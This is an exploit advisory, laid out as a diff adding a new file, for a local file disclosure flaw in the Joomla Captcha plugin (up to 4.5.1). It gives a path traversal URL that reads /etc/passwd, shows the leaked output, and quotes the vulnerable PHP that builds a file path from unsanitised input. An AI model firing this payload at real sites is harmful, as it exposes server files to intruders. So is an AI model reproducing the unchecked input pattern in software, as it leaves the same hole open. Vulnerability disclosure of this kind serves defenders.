@@ -1,0 +1,72 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+ 
+   [ Discovered by dun \ posdub[at]gmail.com ]
+
+ #############################################################################
+ #  [ Joomla Captcha Plugin <= 4.5.1 ]  Local File Disclosure Vulnerability  #
+ #############################################################################
+ #
+ # Script: "Joomla Captcha plugin and patch for Joomla!"
+ #
+ # Script site: http://www.kupala.net/
+ # Download: http://code.google.com/p/joomla15captcha/
+ #
+ # 
+ # [LFI] (magic_quotes_gpc = Off)
+ # Vuln: http://site.com/plugins/system/captcha/playcode.php?lng=../../../../../../../etc/passwd%00
+ #       dun@radius ~ $ cat joomlacaptcha.mp3
+ #       root:x:0:0:root:/root:/bin/bash
+ #       ......
+ # 
+ # File: ./plugins/system/captcha/playcode.php
+ # 
+ #     79	if (!$captchacode) $captchacode = '0000000000';									
+ #     80	
+ #     81	session_write_close();
+ #     82	
+ #     83	@$lng = $_GET['lng'];                                                 // [1]
+ #     84	if ( !$lng ) $lng = 'en-gb';
+ #     85	
+ #     86	$captchafilename = "joomlacaptcha.mp3";
+ #     87	$captchalength = strlen( $captchacode );
+ #     88	
+ #     89	$outlength = 0;
+ #     90	$reallength = 0;
+ #     91	$currsize = 0;
+ #     92	$outstream = '';
+ #     93	
+ #     94	if ($captchalength > 0) {
+ #     95		for ($i = 0; $i < $captchalength; $i++) {
+ #     96			$soundfiles[$i] = 'files/' . $lng . '.' . strtolower( substr( $captchacode, $i, 1 ) ) . '.mp3';   // [2]
+ #     97		}
+ #     98		foreach ($soundfiles as $onefile){                                     // 
+ #     99			if (file_exists( $onefile )) {                                 // 
+ #    100				$instream = fopen( $onefile, 'rb' );                   // 
+ #    101				$currsize = filesize( $onefile );                      // [3]
+ #    102				$outstream .= fread( $instream, $currsize );           // 
+ #    103				$outlength += $currsize;                               // 
+ #    104				fclose( $instream );                                   // 
+ #    105				$reallength += 1;                                      // 
+ #    106			}
+ #    107		}
+ #    108	}
+ #    109	
+ #    110	if (($outstream == '') || ($captchalength != $reallength)) {
+ #    111			$outstream = 0; $outlength = 1;
+ #    112	}
+ #    113	
+ #    114	ob_start();
+ #    115	header( 'Content-Type: audio/x-mpeg');                                         //
+ #    116	header( "Content-Disposition: attachment; filename=$captchafilename;");        //
+ #    117	header( 'Content-Transfer-Encoding: binary');                                  //
+ #    118	header( 'Content-Length: '.$outlength);                                        //
+ #    119	echo $outstream ;                                                              // [4] LFD
+ #    120	ob_end_flush();
+ # 
+ # 
+ # [ dun / 2011-01-09 ]
